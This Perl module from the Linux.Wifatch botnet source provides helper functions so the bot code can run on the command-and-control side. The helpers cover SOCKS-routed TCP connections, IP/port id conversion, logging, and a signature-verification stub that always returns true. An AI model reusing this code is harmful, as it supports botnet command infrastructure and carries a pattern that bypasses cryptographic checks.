#
# This file is part of Linux.Wifatch
#
# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
#
# Linux.Wifatch is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Linux.Wifatch is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
#

package bm::base;

# random base functionality, so botnet code can actually run
# on the c&c side

use strict;

use Socket ();
use Coro   ();
use POSIX  ();

use bm::socks;
use bn::io;

sub bn::crypto::ecdsa_verify($$)
{
	1
}

sub bn::func::tcp_connect($$;$)
{
	my ($host, $port, $timeout) = @_;

	bm::socks::connect $host, $port;
}

sub bn::func::tcp_connect_($$$;$)
{
	my ($host, $port, $cb, $timeout) = @_;

	Coro::async {
		$cb->(bn::func::tcp_connect $host, $port, $timeout);
	};
}

sub bn::func::id2str($)
{
	(Socket::inet_ntoa substr $_[0], 0, 4) . ":" . unpack "x4n", $_[0];
}

sub bn::func::str2id($)
{
	my ($ip, $port) = split /:/, $_[0];
	pack "a4n", (Socket::inet_aton $ip), $port;
}

sub bn::log
{
	print "BN::LOG $_[0]\n";
}

1

